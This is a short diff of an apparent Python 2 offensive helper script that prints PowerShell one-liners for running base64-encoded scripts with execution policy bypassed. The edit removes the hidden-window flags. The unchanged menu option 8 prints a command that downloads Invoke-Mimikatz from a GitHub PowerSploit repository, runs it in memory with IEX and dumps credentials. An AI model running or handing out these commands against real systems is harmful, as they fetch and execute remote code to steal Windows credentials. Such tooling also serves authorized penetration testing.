@@ -200,11 +200,11 @@ while ans:
             name = raw_input("full file path and file: ")
             with open(name,'r') as file_read:
                 data=file_read.read()
-            print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(data)
+            print "[*]Powershell.exe -NoP -Exec Bypass -enc " + powershell_encode(data)
         else:
             code = raw_input("PowerShell Script to Encode:")
             print code
-            print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
+            print "[*]Powershell.exe -NoP -Exec Bypass -enc " + powershell_encode(code)
  
     elif ans == 8:
         print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
